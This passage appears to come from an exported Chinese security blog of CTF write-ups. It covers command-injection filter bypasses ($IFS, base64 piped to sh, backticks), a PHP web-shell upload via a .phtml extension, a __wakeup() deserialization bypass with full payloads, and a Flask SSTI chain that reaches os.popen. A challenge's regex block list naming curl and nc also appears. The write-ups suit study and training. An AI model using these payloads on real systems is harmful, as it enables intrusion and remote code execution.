<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS    //Ubuntu20.04测试通过, 但是后面不能直接跟字符,应该用字符变量.比如str1=fl;str2=ag.php;cat$IFS$str1$str2是对的,而cat$IFSflag是错的</span><br><span class="line">$&#123;IFS&#125;  //Ubuntu20.04测试通过</span><br><span class="line">$IFS$1  //Ubuntu20.04测试通过</span><br><span class="line">$IFS$9  //Ubuntu20.04测试通过</span><br><span class="line">&lt;       //Ubuntu20.04测试通过</span><br><span class="line">&lt;&gt;      //Ubuntu20.04测试通过</span><br><span class="line">&#123;cat,flag.php&#125;   //Ubuntu20.04测试通过</span><br><span class="line">$&#x27;\x09&#x27;  //Ubuntu20.04测试通过,\x09是制表符.使用方法,比如a=$&#x27;cat\x09flag&#x27;;$a</span><br><span class="line">$&#x27;\x20&#x27;  //Ubuntu20.04测试通过,\x20是空格.使用方法同上</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311159568.png"
alt="image-20211031115928471" />
<figcaption aria-hidden="true">image-20211031115928471</figcaption>
</figure>
<p>emmmm, 空格是绕过去了, 但是还有一道<strong>flag</strong>关键词检测.
我们可以先看看<code>index.php</code>里的过滤规则:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311244151.png"
alt="image-20211031124448093" />
<figcaption aria-hidden="true">image-20211031124448093</figcaption>
</figure>
<p>可以看到过滤的内容还是相当多的,
最过分的是<strong>flag</strong>关键词检测, 可谓十分粗暴</p>
<h2 id="方法一-定义变量绕过关键词检测">方法一
定义变量绕过关键词检测:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;str1=fl;str2=ag.php;cat$IFS$str1$str2</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311202013.png"
alt="image-20211031120239967" />
<figcaption aria-hidden="true">image-20211031120239967</figcaption>
</figure>
<p>还是不行,
看样子是要<strong>flag</strong>四个字母顺序出现在命令里就不行, 那好办,
变量俩调换一下位置就可以了:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;str2=ag.php;str1=fl;cat$IFS$str1$str2</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311228589.png"
alt="image-20211031122853535" />
<figcaption aria-hidden="true">image-20211031122853535</figcaption>
</figure>
<p>回显没了? 不慌, 可能是注释, 查看源码, <strong>flag</strong>到手</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311229141.png"
alt="image-20211031122921119" />
<figcaption aria-hidden="true">image-20211031122921119</figcaption>
</figure>
<h2 id="方法二-base64编码后解码执行">方法二 base64编码后解码执行</h2>
<p>利用管道符, 先将命令用base64编码, 再解码传给sh执行,
这里还要采用<code>%IFS$1</code>绕过空格限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
<p>结果同上</p>
<h2 id="方法三-利用反引号内联执行">方法三 利用反引号内联执行</h2>
<p>同样的, 这里也需要用到<code>$IFS$1</code>绕过空格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311234828.png"
alt="image-20211031123455770" />
<figcaption aria-hidden="true">image-20211031123455770</figcaption>
</figure>
<p>查看源码, 可见index.php和flag.php都被显示了出来</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTF2020 新生赛]Upload 1</title>
    <url>/2021/11/01/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload-1/</url>
    <content><![CDATA[<p>进去就是个灯泡, 鼠标移到灯泡上出现文件选择框</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122375.png"
alt="image-20211101212238225" />
<figcaption aria-hidden="true">image-20211101212238225</figcaption>
</figure>
<p>试着上传一个<code>php</code>后缀一句话木马</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122521.png"
alt="image-20211101212227434" />
<figcaption aria-hidden="true">image-20211101212227434</figcaption>
</figure>
<p>前端限制后缀, 直接BP抓包改后缀</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012118453.png"
alt="image-20211101211857333" />
<figcaption aria-hidden="true">image-20211101211857333</figcaption>
</figure>
<p>后端也有限制, 传统艺能, 改后缀为<code>phtml</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012120107.png"
alt="image-20211101212015986" />
<figcaption aria-hidden="true">image-20211101212015986</figcaption>
</figure>
<p>文件直接上传成功, 接下来就是菜刀时间</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012121920.png"
alt="image-20211101212139849" />
<figcaption aria-hidden="true">image-20211101212139849</figcaption>
</figure>
<p><strong>flag</strong>就在根目录</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP的__wakeup()函数漏洞</title>
    <url>/2023/04/06/%5BWeb%5DPHP%E7%9A%84__wakeup()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><code>unserialize()</code> 反序列化产生一个对象时,
会检查对象是否存在一个<code>__wakeup()</code>方法,
如果有则先调用它进行反序列化前的准备工作, 例如重新建立数据库连接,
或执行其它初始化操作.</p>
<p>官方示例:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;server = <span class="variable">$server</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$this</span>-&gt;server, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$this</span>-&gt;db, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当被反序列化的字符串中表示的对象属性个数大于对象实际的个数时,
<code>__wakeup()</code>将被跳过执行.</p>
<p>实验:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//test.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wake Up!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ABC</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="comment">//输出为</span></span><br><span class="line">	<span class="comment">//O:3:&quot;ABC&quot;:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>改一下代码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//test.php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wake Up!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>把刚才的<code>O:3:"ABC":2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code>带入参数<code>str</code>中请求</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304062320038.png"
alt="image-20230406231932410" />
<figcaption aria-hidden="true">image-20230406231932410</figcaption>
</figure>
<p>反序列化触发了<code>__wakeup()</code>方法,
绕过只需要对属性个数进行修改</p>
<p>修改前:<code>O:3:"ABC":2:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code></p>
<p>修改后:<code>O:3:"ABC":3:&#123;s:1:"a";i:1;s:1:"b";i:2;&#125;</code></p>
<p>也就是从2个属性改成3个属性.</p>
<blockquote>
<p>更改属性数量导致与实际数量不符会导致反序列化失败,
但是<code>unserialize()</code>会将遇到错误之前能填充的属性都填充上,
遇到错误之后再执行<code>__destruct()</code>将构造到一半的对象析构,
并返回一个<code>false</code>.
所以在<code>__destruct()</code>方法里可以正常访问已经被填充的属性.</p>
</blockquote>
<p>接下来是一道CTF题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>考点就是绕过<code>__wakeup()</code>, 首先生成<code>Payload</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$i</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;data.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>), <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问一下, 查看<code>data.bin</code>文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304070008126.png"
alt="image-20230407000850092" />
<figcaption aria-hidden="true">image-20230407000850092</figcaption>
</figure>
<p>仔细看的话可以发现,
<code>*</code>的两边都各有一个<code>\x00</code>字节,
但是这在文本上是显示不出来的,
这也是为什么采用写入文件再查看这种麻烦的方式而不采用<code>echo</code>直接浏览器查看.</p>
<p>所以构造<code>Payload</code>的时候要采用<code>%00</code>把<code>\x00</code>字节补上去.</p>
<p>所以<code>Payload</code>就是:
<code>O:3:"ctf":3:&#123;s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:2:"ls";&#125;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304070019586.png"
alt="image-20230407001903508" />
<figcaption aria-hidden="true">image-20230407001903508</figcaption>
</figure>
<p>因为<code>cat</code>被过滤了, 所以用<code>tac</code>就可以了</p>
<p>最终<code>Payload</code>:
<code>O:3:"ctf":3:&#123;s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:12:"tac flag.php";&#125;</code></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Python SSTI</title>
    <url>/2023/04/08/%5BWeb%5DPython%20SSTI/</url>
    <content><![CDATA[<h2 id="python中的特殊属性方法函数">Python中的特殊属性/方法/函数</h2>
<p>在<code>SSTI</code>中,
往往通过<code>寻找基类-&gt;查找子类-&gt;执行危险函数</code>来完成攻击,
需要了解一些<code>Python</code>类的特殊属性/方法/函数.</p>
<ul>
<li><p><code>__class__</code>: 对象的属性, 返回对象所属的类.</p></li>
<li><p><code>__mro__</code>: 类的属性,
返回一个含有所有父类(包括间接父类和本类)的元组.</p></li>
<li><p><code>__base__</code>: 类的属性, 返回类的直接父类.</p></li>
<li><p><code>__bases__</code>: 类的属性, 返回类的所有直接父类.
跟<code>__base__</code>的区别在于, 如果子类是多继承,
<code>__base__</code>只会返回一个, 而<code>__bases__</code>返回所有.
<code>__base__</code>相当于<code>__bases__[0]</code>.</p></li>
<li><p><code>__globals__</code>: 函数的属性,
用于获取某个函数所在处位置的全局命名空间的变量, 当函数位于另一个模块时,
可以获取另一个模块的全局命名空间的变量.</p></li>
<li><p><code>__subclassess__()</code>: 类的方法,
返回类的直接子类.</p></li>
<li><p><code>__dict__</code>: 对象的属性, 一个字典,
储存对象的所有属性.</p></li>
<li><p><code>__init__()</code>: 类的方法, 用于初始化对象.
在<code>SSTI</code>中用它作为跳板拿到<code>__globals__</code>属性.
如果声明类时未重载<code>__init__()</code>,
此时的<code>__init__</code>没有<code>__globals__</code>属性.</p>
<blockquote>
<p>未重载的<code>__init__</code>:
<code>&lt;slot wrapper '__init__' of 'object' objects&gt;</code></p>
<p>重载过的<code>__init__</code>:
<code>&lt;function A.__init__ at 0x00000257D3B0D1F0&gt;</code></p>
</blockquote></li>
<li><p><code>__import__</code>:
这个函数在<code>built-in</code>命名空间里,
效果等同于<code>import</code>语句, 返回值是一个模块对象.</p></li>
</ul>
<h2 id="flask的ssti">Flask的SSTI</h2>
<p><code>Flask</code>是一个流行的轻量级Web框架,
基于<code>Python</code>.</p>
<h3 id="基本使用">基本使用</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)     </span><span class="comment">#设定路由/</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span>   <span class="comment">#函数的返回值作为网页传递给浏览器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()       <span class="comment">#默认监听127.0.0.1:5000</span></span><br></pre></td></tr></table></figure>
<h3 id="使用模板">使用模板</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tpl = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;h1&gt;Hello &#123;&#123; request.args.get(&quot;name&quot;) &#125;&#125;!&lt;h1/&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#可以在模板中使用request, session, config, g对象</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)     </span><span class="comment">#设定路由/</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tpl)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)       <span class="comment">#默认监听127.0.0.1:5000</span></span><br></pre></td></tr></table></figure>
<p>提交一个<code>name</code>参数就可以看到回显了, 但是这个没法注入,
表达式已经执行过了.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091445034.png"
alt="image-20230409144519964" />
<figcaption aria-hidden="true">image-20230409144519964</figcaption>
</figure>
<p>这样就可以注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tpl = <span class="string">&quot;&lt;h1&gt;Hello &#123;0&#125;!&lt;h1/&gt;&quot;</span></span><br><span class="line"><span class="comment">#模板中可以使用的对象</span></span><br><span class="line"><span class="comment">#request, session, config, g, url_for</span></span><br><span class="line"><span class="comment">#namespace, lipsum, range, dict, self</span></span><br><span class="line"><span class="comment">#get_flashed_messages, cycler, joiner</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)     </span><span class="comment">#设定路由/</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(tpl.<span class="built_in">format</span>(request.args.get(<span class="string">&quot;name&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)       <span class="comment">#默认监听127.0.0.1:5000</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091504254.png"
alt="image-20230409150416232" />
<figcaption aria-hidden="true">image-20230409150416232</figcaption>
</figure>
<p>表达式能被执行即可注入.</p>
<h3 id="注入测试">注入测试</h3>
<p>就用上面的代码作为服务端.</p>
<h4 id="找基类object">找基类<code>object</code></h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]        <span class="comment">#把空字符串换成空字典和空列表也行, 下同</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">request.__class__.__base__.__base__.__base__</span><br><span class="line">request.__class__.__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#request可以换成session, config, g等, 但是类继承的层级不一样</span></span><br></pre></td></tr></table></figure>
<p>主要就是利用<code>__base__</code>和<code>__mro__</code>这样的属性找到基类.</p>
<h4
id="找重载过__init__方法的子类">找重载过<code>__init__()</code>方法的子类</h4>
<p>用<code>BurpSuite</code>扫一下<code>__subclasses__()</code>返回的所有类,
根据回显判断<code>__init__()</code>是否被重载过,
也可以根据名字选择已知的某些特殊的类,
比如<code>warnings.catch_warnings</code>,
这个类中含有<code>os</code>模块无需导入.</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091546713.png"
alt="image-20230409154648676" />
<figcaption aria-hidden="true">image-20230409154648676</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091548073.png"
alt="image-20230409154838014" />
<figcaption aria-hidden="true">image-20230409154838014</figcaption>
</figure>
<p>比如这个索引为106的类就重载了<code>__init__()</code>,
接着访问函数的<code>__globals__</code>属性,
通过<code>keys()</code>查看有哪些变量 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">106</span>].__init__.__globals__.keys()</span><br></pre></td></tr></table></figure></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091556501.png"
alt="image-20230409155635438" />
<figcaption aria-hidden="true">image-20230409155635438</figcaption>
</figure>
<p>可以看到, 有<code>__builtins__</code>,
于是可以通过<code>__builtins__</code>里的<code>__import__()</code>加载想要的模块,
比如<code>os</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">106</span>].__init__.__globals__[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;dir&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202304091559865.png"
alt="image-20230409155959824" />
<figcaption aria-hidden="true">image-20230409155959824</figcaption>
</figure>
<p>也可以用<code>__builtins__</code>里的<code>eval()</code>等函数实现<code>RCE</code>或者文件读取写入等功能.</p>
<h3 id="jinja2的特性">Jinja2的特性</h3>
<p>在<code>template</code>中使用变量时,
可以用<code>[]</code>取代<code>.</code>的功能,
同理也可以用<code>.</code>取代<code>[]</code>的功能.
可以用这个来绕过<code>.</code>或者<code>[]</code>的<code>WAF</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line">&#123;&#123; foo[<span class="string">&#x27;bar&#x27;</span>] &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这两行代码可以实现相同的功能, 但有一些细微的区别</p>
<p><code>foo.bar</code>:</p>
<ul>
<li>首先执行<code>getattr(foo, 'bar')</code></li>
<li>如果没找到, 再执行<code>foo.__getitem__('bar')</code></li>
<li>都没找到, 返回一个未定义的对象</li>
</ul>
<p><code>foo['bar'</code>]:</p>
<ul>
<li>首先执行<code>foo.__getitem__('bar')</code></li>
<li>如果没找到, 再执行<code>getattr(foo, 'bar')</code></li>
<li>都没找到, 返回一个未定义的对象</li>
</ul>
<blockquote>
<p>未完待续</p>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SSTI</tag>
        <tag>flask</tag>
        <tag>jinja2</tag>
        <tag>ternado</tag>
      </tags>
  </entry>
  <entry>
    <title>[RoarCTF 2019]Easy Calc 1</title>
    <url>/2021/11/01/%5BWeb%5DRoarCTF-2019-Easy-Calc-1/</url>
    <content><![CDATA[<p>进来就是一个普通的计算器, 输入表达式给出结果,先看一波源代码</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011924048.png"
alt="image-20211101192427994" />
<figcaption aria-hidden="true">image-20211101192427994</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011925244.png"
alt="image-20211101192502182" />
<figcaption aria-hidden="true">image-20211101192502182</figcaption>
</figure>
<p>被设了WAF, 咱也不知道是防的啥, 接着看.
请求参数被发往<code>calc.php</code>, 我们直接访问一下看看:</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011926659.png"
alt="image-20211101192659620" />
<figcaption aria-hidden="true">image-20211101192659620</figcaption>
</figure>
<p>源码直接显示出来了, 可以看到有很多过滤, 很多字符都被列入了黑名单.
先看看能不能得到当前的文件绝对路径</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111011938789.png"
alt="image-20211101193809717" />
<figcaption aria-hidden="true">image-20211101193809717</figcaption>
</figure>
<p>网页直接<code>Forbidden</code>了, 经过测试,
只要<code>num</code>的参数里含除数字以外的字符就会如此,
这应该就是之前说的WAF了, 不绕过这个WAF后面的操作都无法进行下去.
但是要绕过这个漏洞,
首先要知道php在解析提交的参数名和其对应的值时都做了什么</p>
<blockquote>
<p>PHP需要将所有参数名转换为有效键名(比如在$_REQUEST变量里的关联数组里,
有所有提交的参数名和值)</p>
<p>所以<code>php</code>至少会干两件事</p>
<p>1.删除某些字符</p>
